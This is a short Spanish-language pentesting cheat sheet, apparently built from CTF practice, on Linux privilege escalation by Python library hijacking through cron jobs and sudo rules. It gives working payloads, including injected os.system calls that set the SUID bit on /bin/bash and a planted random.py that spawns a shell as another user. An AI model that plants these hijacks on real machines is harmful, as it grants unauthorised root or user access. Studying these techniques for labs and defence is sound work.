## Con tarea cron 

Si nos encontramos un binario de python, que se ejecuta a cada rato o sospechamos que lo hace (YA QUE SI NO LO EJECUTA NUESTRO USUARIO NO LO VEREMOS EN EL CRONTAB) y que tenemos permisos para ejecutarlo pero no para editarlo, no está todo perdido. En ocasiones, algun usuario puede pertenecer a algún grupo que tenga permisos de edición sobre las librerías de python o sobre el directorio en que se encuentra dicho binario.py.

Ejemplo de librería: **/usr/lib/python2.7/ftplib.py**
```bash
### BUSCAR EN TODO EL SISTEMA DE FICHEROS, BINARIOS QUE PERTENEZCAN AL GRUPO
find / -group "grupo" -ls -la 2>/dev/null
```

### Si podemos editar la librería
Si la podemos editar, en alguna parte de su código podemos añadir:
```bash
import os
os.system("chmod 4755 /bin/bash")
```

### Si no podemos editar la librería

Creamos un fichero .py con el nombre de la librería que intenta importar. **Este fichero debe estar en el mismo directorio que el .py que se va a ejecutar**
```python
### CONTENIDO A AGREGAR EN LA LIBRERÍA QUE UTILICE NUESTRO BINARIO.PY DETECTADO
import os
os.system("chmod 4755 /bin/bash")
```

Luego basta con un simple:
```bash
bash -p
```

## Con Sudo -L
Ejemplo, al hacer sudo -L vemos que un usuario puede ejecutar un script en python, y vamos a pivotar a ese usuario.
```bash
aliceawonderland:-$ sudo -l 

User alice may run the following commands on wonderland: (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Teniendo ese script en python, que no podemos editar, pero importa una librería:
```python
import random

resto del script
```

Si creamos un **random.py** en el mismo directorio que el script, este script al importar random, en realidad está importando nuestro random.py. Con lo que podemos introducir en random.py el siguiente código:
```python
import os
os.system("/bin/bash")
```

Luego basta con:
```bash
sudo -u <rabbit> /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
